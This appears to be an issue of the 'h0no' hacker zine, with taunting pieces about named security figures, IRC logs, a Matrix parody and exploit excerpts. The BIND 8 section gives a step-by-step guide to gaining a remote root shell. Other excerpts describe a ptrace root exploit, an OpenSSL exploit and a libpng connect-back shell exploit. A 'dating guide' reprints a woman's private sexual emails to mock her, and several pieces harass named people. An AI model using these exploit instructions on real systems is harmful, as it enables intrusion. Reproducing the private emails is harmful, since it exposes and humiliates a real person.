wow, r4t sure can admin a box.  setting all users to default passwords is a 
great security idea!  we'll keep how we got roberto's password an excercise 
for the reader.

thiago's main box is introduced to the axe.

18.txt-~-~-~ The h0no true story of lance spitzner

Lance Spitzner and his Satanic powers


"The coming of the lawless one will be in accordance with the work of lance 
displayed in all kinds of counterfeit logs, signs and wonders, and in every sort
of hack that deceives those who are of whiteish hat."  (2 Thessalonians 2: 9-10) 

I have encountered many bugtraq $uper$tarz who indulge in detestable practices, 
but I was unaware of the of extent of spitzism on full disclosure until 
recently. Few people know that lance is one of the most evil of the hackers. 
Unknown to his legions of fans, he is in fact a disciple of TESO and uses his 
special powers to devastating effect.

I first noticed that there was something peculiar about Mr Spitzner when he 
hacked one of my boxes, CVS.defensivecoding.net. Every time he appeared on the 
box I noticed that my 0days would be in #darknet. Now I am not a swap'n kid, so 
I can only assume that it was an example of Spitzner's sinister ./ac1db1tch3z 
technique.

The next time something blackhat happened to me with lance involved was when I 
went to my router, only to see logs of him trying to hack neohapsis.com with 
XSS. I should point out that I only went to see this log for educational 
purposes, I wanted to research for an article on how using xss can be dangerous
for large corperations and that the blackhats on the internet are highly 
efficent.

I don't know what happened when I was in the router, but my suspicions about 
Lance Spitzner proved to be correct. The log started to increase in size and I 
was locked out. The next thing I saw was 1000's of A's being printed to my 
syslog.  Obviously evil Mr Spitzner had made a daemon possess my connection and
alerted his blackhat friends of my current location. I know this is the case 
because my friends are all whitehat.

Lance Spitzner even uses his blackhat powers to disrupt my coding. He enters my
terminal in spirit form and persuades me to participate in detestable 
backdooring practices with him. He only does this to cause me embarrassment on 
full disclosure list.  My posts are never without some sort of backdoor since Mr
Spitzner started using his powers on me.

The misery doesn't stop there, as well as having the overwhelming urge to hack 
whenever I see Lance Spitzner, I also face abuse from his minions. I have to 
JOIN #no.disclosure when I go to #core and I am constantly taunted with shell 
requests. They are sick! I disclose like a whitehat and run redhat 6.3 with my 
neatly coded xss scanner and a tight white hat over my grey hair. I am a 
paragon of whitehat and am not a darkside hacker.

This is a nightmare story. I am not a darkside hacker and Mr Spitzner is using 
his mysterious powers to hack me into submission. He is a part of the evil 
blackhat conspiracy and wants to discredit members of the full disclosure 
movement. But I will not stay silent on this issue. I know exactly what is 
happening. I hope that by taking this brave step, other leading figures in the 
full disclosure movement will come forward to tell of their experiences.

I am not ashamed about what has happened because I am NOT a darkside hacker.



19.txt-~-~-~ IRC hacker gang exposed

Rin0 (rinazzo@hotmail.com) is a .it hacker who doesn't seem to hack much.  
Is he whitehat, greyhat, blackhat?  He doesn't know which he is lamest at.
His claim to fame is his realsuck.c exploit and his attempt at starting 
his own private darknet on ircnet.

I didn't know irc whoring was a skill.  Better go drink your hackeraid Rin0 ;-)

PRIVMSG [Aw] :You've got a hole in your SSL, you should patch the hole before 
somebody does something dumb with your box. (As in not me, im just a whitehat
hacker.)i
PRIVMSG [Aw] :Sorry for hacking you. (:
PRIVMSG [Aw] :-warchild

Since we dont know their encryption we can only guess that this is indeed a 
honeypot. As rave has proven time and time again, when someone gets owned their
box becomes a honeypot. Thanks for your numerous contributions to the honeynet 
project!  Lance will give you a cookie.

21.txt-~-~-~ druid the great honeypot hacker

Honeypots are useful to h0no as they are to whitehats.  Not that 
hacker caught is a bad fellow.  He codes his own exploits from 
public vulns, and he even made a pretty cool ssl mod which made 
the use of targets obsolete.  It's too bad that the legendary 
leader of the vmatrics owns random windows boxes with little 
care.


His version of the classic ptrace exploit:

/*

ptrace24.c  Exploit for execve/ptrace race condition
            in Linux kernel < 2.4.9

Improved by Druid

It should work on openwall-patched kernels (but not on
Openwall GNU Linux as Nergal mentioned in advisory)

It gives instant root with any of: su, newgrp, screen [if +s]
(assuming if no password requiered) just change #define TARGET.
Actually, any suid program that gives you a shell will work :)

NOTE: This works only if it's executed on a tty [i.e. interactively].

       <druid@vmatrics.org>

His version of the very abused OpenSSL-to-open exploit:

/*
 *
 * OpenSSL-too-open - Apache + mod_ssl + unpatched OpenSSL <= 0.9.6d remote 
 * exploit
 *
 * Spawns a nobody/apache (or whatever user Apache is running on, maybe even 
 * root).
 *
 * This xploit was enahnced by Druid <da_hack_er@yahoo.com>
 * You don't need any damn targets/offsets, it should give you instant-shell
 * if the server is vulnerable...
 *
 * Thanks to the one that made the original openssl-too-open sploit

His version of the Bind 8.x exploit:
 
/*

dr_bind8.c     BIND 8.x (8.2.3-T6B <= x <= 8.3.3-REL) Remote Root Exploit

             * PRIVATE * DO NOT DISTRIBUTE *


Vulnerable versions
-------------------

8.2.x (starting from 8.2.3-T6B, which includes 8.2.3-REL)
8.3.x (up to and including 8.3.3-REL)

Exploit HOW TO
--------------
	
Let's say that you have a machine leet.hax0r.com (that resolves to 192.168.0.1)
and you own the nameserver 192.168.1.1 (that is authoritative for domain 
evol.net) and you want to attack victim.com. Here's what you got to do:

1. Modify the ns's zone file for evol.net and add a line like this (you can 
change `mata` to anything you like): "mata 1D IN NS leet.hax0r.com."
(you only have to do this once and exploit many times ;)

2. Identify the victim version ("host -c chaos -t txt version.bind") and see if
it's vulnerable

3. Identify the victim's linux distribution (by grabing de webserver version or
ftp banners or any other methods you can think of) and search the net for the
binary RPM or package

4. Extract named binary from the distribution and run
"objdump -R named | grep close" and you'll get an offset like 0x08XXXXXX

5. Compile & run the exploit (the -i stuff is optional... if u have more IPs):
./dr_bind8 -h victim.com -d mata.evol.net -i 192.168.0.1 -f 0x08XXXXXX -c 
0x08200000 -n 20

If you get lucky, you'll get a shell... if u get a SEGV, you either had the
wrong -f arg or -c... you probably won't have another shot at this because named
is dead and somebody has to restart it, but next time you should use a bigger 
-n arg

The bigger the -n arg, the more chanses you have to succesfully exploit bind, 
but it'll take longer (he'll have to send 64k * n_arg bytes to the victim)

The general rule is: if the -n arg is bigger, then the -c argument doesn't have 
to be that exact. So if you use -n 100, then -c can ussauly be within 
0x08200000-0x08800000 and won't make much difference, but you should use 
0x08500000 in that case... to be safe ;)  If you get stuck at Phase #1 then you
should decrease the -n arg...

By the way... if you are really unlucky then you will land exactly on the 16 
bytes of the malloc chunk header (out of a 65000 bytes of shellcode) and the 
exploit will fail... I guess you need 1% luck :P

The key of using this exploit is having the exact binary that the victim has
(so we can grab the -f offset)... I guess you won't have much chanse in 
exploiting a compiled-by-hand binary (not default) if you can't get a hold of 
it.

Uhh... I'm to lazy to finish the target stuff... so you have to do it 
yourself... just get some default packages of some distributions and run objdump
(see above)


Well... good luck and a Happy New Year!

24.txt-~-~-~ dvdman's guide to internet dating

hello and welcome.  If you are reading this be forewarned, this article may not 
be suitable for children under the ages of 12.  It contains JPG nudity and 
obscene attempts of an internet slut trying to get into my levis.

My name is DVDMAN, and this my friends is DVDMAN's guide to internet dating.  I 
originally planned this text to be extended into a book, but O'reilly refused 
to even meet with me about it.

Enough about me, let's get you goons laid.  I will be taking you through a real 
life example of me pimpin a real life internet slut!

I started by subscribing to every internet dating mailing list.  Although there 
is a high ratio of guys to girls on these, I found one which was the jackpot. 
The "kenya_discreet_youngermen_olderwomen" list on groups.yahoo.com was it!  I 
would suggest this for any other lonely 21 year old males who live in new york.

Not more than 6 months later, I got this reply!

queens and would like to get hooked up with a (semi) younger man.  I just moved
to queens december 23rd and haven't really met many people yet. I am working on
getting my photo online, but here is a discription.  I am 25 years old, 5 foot 8
inches, and 130 pounds.  I have light brown hair and very nice brown eyes.  I 
would like to go on a date with someone who likes to to have fun.
 
Please if you could, send me a picture of you (the more the merrier) And tell me
a bit about yourself.  Maybe if we click we can get to know eachother better.  
Worth a shot =)

It's always a good idea to provide personal info to people you dont know on the 
internet.

I live in corona.. You are very nice looking.  clean cut, I like that.  This is
the 2nd time I have meet someone online, the first worked out fairly well.  I 
think it is nice since we can get to know eachother first without having to 
really comit on a date or anything.  That way if we aren't attracted we can just
cut our losses.. or if we are things can progress.  So can you tell me a bit 
about yourself?  This should get us started.
 
What do you do for a living? (I am full-time waitress till I find a real job =)
 
What are you going to school for? (I went for marketing)
 
How many pets do you have?  (I LOVE that dog. what kind is it?)
 
When was your last relationship and how long did it last?  (4 months ago. it 
lasted 8 months)
 
What do you see yourself doing in 2 years? (finding a decent apartment, getting
a pet)
 
in 5 years? (working way up in job)
 
in 10 years?  (director of sales for a mid to large company)
 
What do you do for fun? (I like to do HTML, rollerblade, and cuttle)
 
Are you good with computers?  (I like them.  I find them very interesting.)
 
Do you like to kiss? (I like to tease men with my tounge)
 
Do you like to have sex?  (I can be a nympho at time. but I enjoy sex on a 
regular basis... I haven't had sex since my last relationship, so it's kinda on
my mind alot these days.)
 
Do you like oral sex?  (It may sound strange, but I like to give oral sex.  To 
please a man is a very satisfying thing.  I feel as if I am very in touch with 
them and they enjoy my company).
 
Any turnoffs?  (I do not like dirty/messy guys, and by this I mean their looks.
They must be atleast somewhat clean.  Not obsessively, but atleast comb hair on 
most days. hehe.  I do not like guys always paying for everything.  I make a 
decent amount and have a bit in savings, I can afford my own meal/clothes.  I 
definately do not enjoy any kind of s&m or other dangerous sex.  Although I have
never tried it.. the thought of getting pleasure through real pain is not a turn
on for me.)
 
Hope I didn't scare you away with my turn offs.  hehe.  I am a pretty sweet gal 
and I really enjoy others company.  I am feeling pretty lonely recently 
concidering my family is in wisconsin.
 
I am talking to my little brother.. he is gonna help me get a good digital 
camera.  He gets back from vacation on january 10th.  I will send you my 
pictures sometime after.  You know a good digital camera?  Under $400 if 
possible.

Currently I am going to school full time to get my computer science degree. I am
not working as of now. I have one dog (chewy, pit-bull) and i have two birds 
(cockatiel,conure).

My last relationship lasted almost one year. I like to stay with a person i enjoy
to be around. I am a one girl guy for sure.

in two years I see my self graduating from college and going for my masters 
hopefully.  In 5 years having a nice well paying job. in 10 i don't think that 
far :P

Yes, I very much love computers, I been using them since im about five years 
old. I love programming and talking on irc very much.

I *LOVE LOVE LOVE* to kiss.


I am diffidently a nympho when it comes to sex. I just cannot get enough. I 
haven't had sex since last year really.

Yes i like to give oral sex and receive it.

hmm turnoffs, I guess a messy person and dirty all around. super loud and 
obnoxious.

Dig cam: Get something with at least 2 mega pixels. Check 
http://shopping.yahoo.com

Look up a fuji finepix they are really cheap and a super nice camera.

I am sicilian/Italian/irish by the way. I didn't mention it before.

For fun: I like to play tennis sometimes. golf,movies,chat online and cuttle for
sure ;)

Was that last yes a yes to my naked pics ;)

John

This has been killing me. Why do you always email at > 2am? I usally try to stay
awake to hear from you :)  If you keep doing this I may have to just meet you 
for coffee or something hee

Until next time, this is DVDMAN aka "pimpdaddy".

<Smith> well mr. neo, it looks like you've been pretty busy for quite some time 
        now.
<Smith> it seems... you've been leading two clients.
<Smith> the first one is involved with jeet hax0ring
<Smith> where you crack into protected systems with leet trojans
<Smith> and deface them under the name of 'Ron885'
<Smith> .... and are guilty of virtually every software crime we have a law for.
<Smith> the other, is a normal j00ser...
<Smith> who even helps the lamers out with perl coding.
<Smith> one of these connections, has a future.
<Smith> i'm willing to wipe the slate clean, give you a fresh start.
<Smith> .... my colleages think i'm wasting my time here, that you will not 
        respond.
<Smith> all you have to do, is tell me what contact you had with the 
        international terrorist called 'morphious'.
<Neo> well, that sounds like a really good deal.
* Smith hmmmms...
<Neo> but i think i've got a better one.
<Neo> i give you the finger
-> [Smith:FINGER]
<Neo> and i make a phone call to your isp for harassment. You don't scare me 
      with the gestappo crap, i don't have to reveal who i've been chatting 
      with.
<Smith> tell me, Mr. Neo. How can you make a phone-call.... if you don't.. have

* Neo nods
<Morphious> The matrix cannot be explained, it can only be experienced.
<Neo> try me ffs. I've been waiting for ages.
<Morphious> Okay, For what it's worth, the matrix, is the wool that has been 
            pulled over your eyes to blind you from the truth. An invisible 
	    prison of which you cannot touch nor taste nor smell. The matrix,

            raw messages.

<Morphious> ahem....
<Morphious> so Neo, do you want to know. what the matrix is?
<Neo> will i ever know or will you keep asking me if i want to?

<Neo> ah...... (?)
<Morphious> this is the network as you know it....
*** Dcc send complete (matrixnetwork.jpg)
<Morphious> at the end, of the 20th century. MatrixNet, running unrealircd....
<Morphious> A technological wonderland, a network to many millions of people.
<Morphious> this, is the real world....

---- Neo's desktop theme changes to a normal mountain scene

<Morphious> welcome, to the eliteness, of the real.
<Morphious> you believe it is the year 1999 but it is actually closer to the 
            year 2199
<Morphious> i can't tell you exactly what year it is because we honestly don't 
            know...
<Morphious> At the end of the 20th century, man marvelled as he gave birth, to 
            the internet
<Morphious> I don't know much about what happened afterwards, 
            but i do know that it was us who made the chatrooms.
<Morphious> This was only the beginning, after this people programmed bots.
<Morphious> people were pushing for better and better bots. finally, the bots 
            became sentiant..
<Morphious> They began to think for themselves, the leader was called 
            'drkplague' and he wreaked havoc amongst the human users. He 
	    eventually combined with another evil IRC genius called 'khaled' and
	    together they found a way to entrap users on IRC whilst preventing 
	    them from knowing so. he called this method mIRC. Matrix IRC.
<Morphious> For centuries man has been dependant on bots to keep their channels
            alive, fate, it seems, is not without a sense of irony.
<Morphious> i didn't believe it myself until i seen the channels with my own 
            eyes i watched them kick the idle so they could preserve the active.
<Morphious> The matrix, is a computer generated dreamworld designed to turn the 
            human race...
<Morphious> into this...
<Morphious> Current local users: 1,564,765 global: 21,4053,3593
<Neo> no, your wrong, i was on small servers too
<Morphious> you've been living in a dreamworld neo.
<Neo> no.... it.... can't be true.
<Neo> no, i won't believe it
<Neo> lemme out! i can't quit
<Neo> lemme out! outttt!

----- some time later -------
*** Now talking in #neoroom
<Neo> urgh... wtf..
<Morphious> i must apologise
<Neo> ?
<Morphious> we have a rule, we never free a client once it's reached a certain 
            uptime although, i had to in this case.
<Neo> why?
<Morphious> because i needed to.
<Morphious> when the matrix was first setup, a man was an IRCop inside it and 
            had the ability to ./config things as he saw fit, when he died, 
	    or4cl3 prophesised his return; ...
<Morphious> the return; would spell the end for the bot's hold over the matrix 
            IRC client compilation.
<Morphious> anyway, get some downtime, your gonna need it.
<Neo> why?
<Morphious> you'll see

<Morphious> yes, they can move through any user still connected to their 
            network.

<Morphious> Indeed. They are they are the gatekeepers, the guardians to every 
            channel, they have all the usermodes, and sooner or later, somebody 
	    is going to have to hack them.
<Morphious> I won't lie to you neo, everyone who has tried to hack an agent has
            been /kill'ed, i've seen an IRCop gline thru a few bnc's, hax0rs 
	    have emptied entire clips of smurfs at them and hit nothing but

<Cypher> bet ya never saw it comin'
<Cypher> i wish i could be in the channel, when they break ya
<Cypher> i wish i could /join rigggght then so you knew it was $me all along.
* Cypher looks @ trinity
<Cypher> your a very beautiful woman
<Cypher> you know trinity, for years i liked you, i thought i was in love, but 
         you were too blind to see it.
<Cypher> i've been chatting with the same old users every morning of every day, 
         and where is it got me? nowhere, if i had to choose between the 
	 realircd and the unrealircd, i choose the unrealircd.
<BNCbot> <Trinity> but it's not real!
<Cypher> i disagree trinity, i think it can be very real. More real than this 
         anyway.
<BNCbot> <Trinity> besides, you can't connect into it normally, your already 
                   disconnected.
<Cypher> i've made a deal with them, they are gonna reconnect my client into 
         the matrixnet.
<Cypher> and to prove it to you, your gonna watch apoc die in front of you
*** apoc has quit IRC (no route to host)
<BNCbot> <Trinity> cypher, you bastard.
<Cypher> don't blame me trin, i'm just a messenger
<Cypher> ?G0t any last words for switch?
<BNCbot> <Switch> not like this.... not like this....
*** switch has quit IRC (no route to host)
<Cypher> too late!
<BNCbot> <Trinity> god damn you cypher.
<Cypher> now, i always said that there wasn't gonna be a 'oNe', but you didn't 
         believe me, instead you bought into morphious' bs.
<Cypher> if i disconnect him now, how can he be the oNe, i mean....
<Cypher> how can he be the one... if he's dead?
<Cypher> look at his gecos
<Cypher> his big pretty colourchar riddled gecos, and tell me
<Cypher> is he.... the oNe?
<BNCBot> <Trinity> yes....
<Cypher> omg.

--- a minute later ---
<Trinity> thanx, omg, your lagged.
<Tank> i'll be alright
<Trinity> Dozer?
<Tank> :/
* Trinity hugs tank
<Trinity> it'll be okay.

--- in the matrix, in #interrogation on a private hidden ip government leaf ---
<Agent_Smith> he's still here
<Agent_Harry> maybe the outsiders are unable to terminate the connection
<Agent_Tom> in which case they are all dead
<Agent_Harry> or they will sever the link as soon as possible
<Agent_Smith> we are going to ask you some questions now.
<Agent_Smith> and i believe it would be in your best intrests to answer them
<Agent_Smith> i am looking for the shell passwords to the xion hubs
<Agent_Smith> and i believe you have them, isn't that right?
<Morphious> guh?
<Agent_Smith> if you decide not to cooperate, you may.. how shall i say.. phace 
              the consequences?
<Morphious> eek!
<Agent_Smith> good...

-------------------


------ back to trinity and neo ------

<Neo> how come he's still alive?
<Tank> The serveradmin of every server is given the access codes to the xion 
       hubs if a matrixnet oper were to get his hands on those codes...
<Trinity> we can't let that happen.
<Neo> what are they doing to him?
<Tank> they are trying to hack into his client, to get the xion password 
       aliases.
<Tank> it's like hacking a hotmail password... All it takes is time.
<Tank> and when they do, his version reply will change from:
       this: [Morphious VERSION REPLY] rIRC - the REAL IRC 1.3.37a
       to this: [Morphious VERSION REPLY] matrix-IRC32 v5.91 K.Mardam-Bey && the
       matrixnet krew
<Neo> so what can we do?
<Tank> we have to pull the plug
<Trinity> you want to /kill him? ..... /KILL morphious ? ......
<Tank> it's the only way.
<Tank> i'm sorry morphious
<Tank> you were like... a father to us all....
<Neo> wait, i don't believe this is happening
<Tank> Neo, this has to be done...
<Neo> no, i don't think it does, something or4cl3 said.
<Trinity> what did she say?
<Neo> she said i ain't the oNe....
<Trinity> no, but you have to be
<Neo> sorry trinity... i'm not.
<Trinity> no, you have to be.
<Neo> why?
<Trinity> i can't say.
<Neo> i'm gonna connect and get him
<Tank> NEO! i want morphious back too, but he gave his bandwidth to get you out 
       of there what you are purposing is self killage ffs...
<Neo> it's gonna work
<Tank> besides, even if you do manage to join the chan, those are IRCops there, 
       3 of them. nobody has ever done anything like this....
<Neo> that's why it's gonna work.
<Trinity> then i'm coming too
<Neo> no your not.
<Trinity> excuse me?
<Trinity> you ARE going to need help on this mission... and besides....
<Trinity> i'm the ranking member of staff on this network, so if you don't like 
          it, you can /kiss my azz, comprehend??
<Neo> okay then, i guess you can come too...
<Tank> ait' let's get you guys connected up.

--- a few minutes later ---
--- trinity and neo are in the loading channel ---

<Tank> so what do you guys need?
<Neo> 0-d4yz, lots of 0h-dayzzz

------ back in #interrogation in the matrix -------------
<Agent_Smith> why isn't the script mod working?
<Agent_Harry> perhaps you arn't sending the right ctcps
<Agent_Smith> chargh!
<Agent_Smith> leave me alone with him. 
<Agent_Smith> .....
<Agent_Smith> now!
*** Agent_Harry has parted #interrogation
*** Agent_Tom has parted #interrogation
<Agent_Smith> isn't it amazing, one could just marvel at it's complexity... it's
              genius...
<Agent_Smith> millions of people just, chatting out their lives..
<Agent_Smith> oblivious...
<Agent_Smith> you know....
<Agent_Smith> the first matrix was designed to be a perfect user net, with 
              nonsuffering and no spam or warbots, but nobody would accept the 
	      ircd your primitive cerebrum kept trying to "disconnect" from, 
	      entire channels were lost...
<Agent_Smith> some say, we lacked the programming language to describe your 
              perfect ircd...
<Agent_Smith> So the matrix, was redesigned... to this.
<Agent_Smith> during my time here, i have done some research, to try and 
              classify your species.
<Agent_Smith> and i have came to the conclusion that you arn't actually users...
<Agent_Smith> every user, naturally developes a stable equilibrium with the 
              surrounding channels.
<Agent_Smith> you humans, do not...
<Agent_Smith> you move to a channel
<Agent_Smith> and you /invite .... and you /invite
<Agent_Smith> until every server resource is consumed
<Agent_Smith> the only way you can survive, is to spread, to another server..
<Agent_Smith> there is another type of client which follows the same pattern...
<Agent_Smith> you know what that is?
<Agent_Smith> a floodbot
<Agent_Smith> human beings are a plague upon this network
<Agent_Smith> and we... are the cure
<Agent_Smith> ............
<Agent_Smith> i'm going to be honest with you morphious...
<Agent_Smith> Agent_Smith sets mode -ocfbAWNwhHqS
<Agent_Smith> you whois that? i'm not gonna lie.
<Agent_Smith> i ... HATE this network....
<Agent_Smith> this chatroom, this communications area
<Agent_Smith> whatever you want to call it. being an oper on this network SUCKS.
<Agent_Smith> it's the users!
<Agent_Smith> i can, taste, your stupid questions, i am bombarded with them 
              every day
<Agent_Smith> yes..... It's repulsive, isn't it?
<Agent_Smith> and every time i get one i feel i've somehow been infected by it.
<Agent_Smith> i NEED to get out of here
<Agent_Smith> and in this client's ssh client config is the key
<Agent_Smith> my keys!
<Agent_Smith> i need those passwords you understand?
<Agent_Smith> once xion is destroyed there is no reason for me to be here.
<Agent_Smith> your going to give me those keys, or your going to die.

 * Description: flow-browseshell.c (www.flowsecurity.org)
 * 		
 * 		Proof of Concept remote exploit for libpng 1.2.5 and prior bug,
 * 		it gets remote shell by faking a remote http server and sending
 * 		an "evil" file that spawns shell by connect back at door 7776.
 * 	
 * 		It has been successfull tested on:
 * 		
 * 		Suse Linux - Mozilla\Netscape\Konqueror
 * 		Slackware Linux 10.0 - Mozilla\Netscape\Konqueror
 * 		Slackware Linux 9.0 - Mozilla\Netscape\Konqueror
 * 		Debian Linux 3.0 - Mozilla
 * 	        Possible others with GENERIC return address.
 *
 *  	        
 * Considerations: Based on Priv8security.com exploit.

h0no team is here to rock the scene.  You best wait till the next issue, cause 
we'll be DDoS'ing and cracking serialz for months.  We have decided the next 
release will only contain random /etc/shadow files from the reflux/nixsec crew.

sadly, one of the core h0no staff has been detained.  Although innocent of the 
crime, his friend's and family's computers have been seized.  If you, or 
anyone you know have information in the theft of the cisco ios 12.x src please 
contact the Metropolitan Police Computer Crime Unit by calling 020 7230 1279 
or replace him as the new member of h0no team.

h0no would like to give shouts out to awc, phsc, ssc, rolf, phc, el8, bow, and 
jake@osvdb for the crazy ownings they have done.  

With an extra special thanks to route, who has shown us that by writting 
worthless zine articles it can lead to multi-dozen-dollar book deals.  And a 
very extra special thanks to dvdman, for getting owned more than jobe.

ps. bx, we are comming for you.
